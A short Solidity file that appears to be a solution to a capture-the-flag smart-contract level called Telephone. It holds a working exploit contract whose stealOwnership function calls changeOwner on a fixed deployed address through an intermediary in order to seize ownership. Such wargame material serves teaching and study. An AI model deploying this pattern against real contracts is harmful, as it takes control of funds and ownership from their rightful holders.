// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Telephone} from "./L5__Telephone.sol";

// Claim ownership of the contract below to complete this level.

contract L5_Caller__Telephone {
    Telephone public telephone =
        Telephone(0x1d092Ab0beDb5e32920f7b1D16C4d6036899D7CC);

    function stealOwnership(address _robberAccount) public {
        telephone.changeOwner(_robberAccount);
    }
}
